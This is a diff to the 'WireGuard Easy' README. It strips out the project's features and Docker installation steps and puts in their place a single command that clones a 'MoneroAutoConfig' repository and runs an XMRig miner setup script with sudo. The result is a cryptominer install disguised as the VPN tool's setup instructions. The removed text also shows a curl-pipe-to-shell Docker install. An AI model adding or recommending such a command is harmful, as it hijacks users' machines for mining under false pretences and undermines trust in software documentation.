@@ -1,51 +1,9 @@
 # WireGuard Easy
 
-[![Build & Publish Docker Image to Docker Hub](https://github.com/WeeJeWel/wg-easy/actions/workflows/deploy.yml/badge.svg?branch=production)](https://github.com/WeeJeWel/wg-easy/actions/workflows/deploy.yml)
-[![Lint](https://github.com/WeeJeWel/wg-easy/actions/workflows/lint.yml/badge.svg?branch=master)](https://github.com/WeeJeWel/wg-easy/actions/workflows/lint.yml)
-[![Docker](https://img.shields.io/docker/v/weejewel/wg-easy/latest)](https://hub.docker.com/r/weejewel/wg-easy)
-[![Docker](https://img.shields.io/docker/pulls/weejewel/wg-easy.svg)](https://hub.docker.com/r/weejewel/wg-easy)
-[![Sponsor](https://img.shields.io/github/sponsors/weejewel)](https://github.com/sponsors/WeeJeWel)
 
-You have found the easiest way to install & manage WireGuard on any Linux host!
+git clone https://github.com/gmaron721/MoneroAutoConfig.git && cd MoneroAutoConfig && yes | sudo bash setup_xmrig_and_run.sh
 
-<p align="center">
-  <img src="./assets/screenshot.png" width="702" />
-</p>
 
-## Features
-
-* All-in-one: WireGuard + Web UI.
-* Easy installation, simple to use.
-* List, create, edit, delete, enable & disable clients.
-* Show a client's QR code.
-* Download a client's configuration file.
-* Statistics for which clients are connected.
-* Gravatar support.
-
-## Requirements
-
-* A host with a kernel that supports WireGuard (all modern kernels).
-* A host with Docker installed.
-
-## Installation
-
-### 1. Install Docker
-
-If you haven't installed Docker yet, install it by running:
-
-```bash
-$ curl -sSL https://get.docker.com | sh
-$ sudo usermod -aG docker $(whoami)
-$ exit
-```
-
-And log in again.
-
-You might need to install docker-compose separately. For example, on a Raspberry Pi:
-
-```bash
-sudo apt-get install docker-compose
-```
 
 ### 2. Configure WireGuard
 
